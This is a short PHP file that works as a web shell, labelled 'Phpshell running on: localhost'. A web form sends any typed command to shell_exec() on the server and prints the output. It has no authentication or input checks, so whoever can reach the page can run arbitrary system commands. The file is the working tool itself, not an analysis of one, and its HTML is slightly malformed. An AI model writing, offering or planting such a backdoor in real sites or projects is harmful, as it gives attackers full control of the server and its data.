<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<link rel="stylesheet" type="text/css" <title></title>
	</head>
	<body>
		<div id="wrapper">
			<div>
				<h3>Phpshell running on: localhost</h3>
			</div>
			<div>
				<h3>Current Working Directory: <?php echo shell_exec("chdir"); ?></h3>
			</div>
			<div>
				<form method="post">
					<div>
						<textarea name="shell" id="shell"></textarea>
						<input type="text" name="command">
					</div>
					<div>
						<input type="submit" value="Execute Command" name="submit">
						<button onclick="cleara()">Clear</button>
						<button>Logout</button>
					</div>
				</form>
			</div>
		</div>
	</body>
	<script type="text/javascript">
		function cleara() {
			var s = document.getElementById('shell');
			s.value = "";
		}
	</script>
</html>

<?php
		header('Content-Type: text/html; charset=utf-8');
		if (isset($_POST['submit'])) {
			$output = shell_exec($_POST['command']);
			$output = addslashes($output);
			print($output);
			//echo "<script>document.getElementById('shell').value = \"" . $output . "\";</script>";
			//echo htmlspecialchars("<script>document.getElementById('shell').value = \"" . addslashes($output) . "\";</script>");
			/*?><script>document.getElementById('shell').value = "<?php print($output);?>"</script><?php*/
		}
	?>